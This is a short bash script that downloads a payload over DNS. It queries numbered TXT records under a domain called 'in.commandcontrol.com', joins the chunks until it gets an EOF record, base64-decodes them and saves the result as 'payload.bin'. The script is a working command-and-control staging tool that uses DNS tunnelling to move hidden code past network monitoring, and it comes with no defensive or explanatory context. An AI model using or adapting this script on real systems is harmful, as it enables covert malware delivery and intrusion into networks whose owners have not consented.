#!/bin/bash

# Variables
SUBDOMAIN="in.commandcontrol.com"
OUTPUT_FILE="payload.bin"

# Initialize variables
i=0
RESULT=""

# Loop to query each chunk until we receive "EOF"
while true; do
    RECORD="${i}.${SUBDOMAIN}"
    RESPONSE=$(dig +short "$RECORD" TXT | tr -d '"')

    # Check if the response is EOF
    if [[ "$RESPONSE" == "EOF" ]]; then
        echo "EOF received. Stopping."
        break
    fi

    # Concatenate the response
    RESULT+="$RESPONSE"
    echo "Retrieved chunk $i"

    ((i++))
done

# Decode the concatenated base64 data and save it to the output file
echo "$RESULT" | base64 --decode >"$OUTPUT_FILE"
echo "Data written to $OUTPUT_FILE"
